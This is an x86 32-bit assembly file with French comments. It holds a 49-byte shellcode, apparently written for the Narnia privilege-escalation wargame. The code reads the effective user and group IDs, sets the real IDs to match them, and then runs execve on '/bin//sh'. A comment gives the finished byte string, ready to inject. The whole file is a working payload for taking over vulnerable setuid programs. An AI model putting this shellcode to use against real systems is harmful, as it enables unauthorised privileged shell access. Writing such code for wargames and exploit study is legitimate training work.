bits 32
global _start

_start:
	xor eax,eax

	; geteuid pour avoir l'utilisateur courant éxécutant le programme

	mov al, 49
	int 0x80

	; setreuid pour utiliser l'utilisateur courant du programme 

	mov ebx,eax
	xor eax,eax ; obligatoire pour narnia (je ne sais pas pourquoi) 
	mov ecx,ebx 
	
	mov al, 70
	int 0x80

	; getegid pour avoir le groupe courant éxécutant le programme 	

	mov al,50
	int 0x80

	; setregid pour utiliser le groupe courant du programme 

	mov ebx,eax
	;xor eax,eax
	mov ecx,ebx

	mov al,71
	int 0x80

	; exercve

	xor ecx,ecx
	mul ecx

	push eax           
	push dword 'n/sh'
	push dword '//bi'

	mov ebx, esp
	
	mov al, 11
	int 0x80

; shellcode 32 bits généric il utilise seteuid et setegid avec un get pour avoir ceux du 
; fichier source 
;\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x31\xc0\x89\xd9\xb0\x46\xcd\x80\xb0\x32\xcd\x80\x89\xc3\x89\xd9\xb0\x47\xcd\x80\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80

; 49 bytes
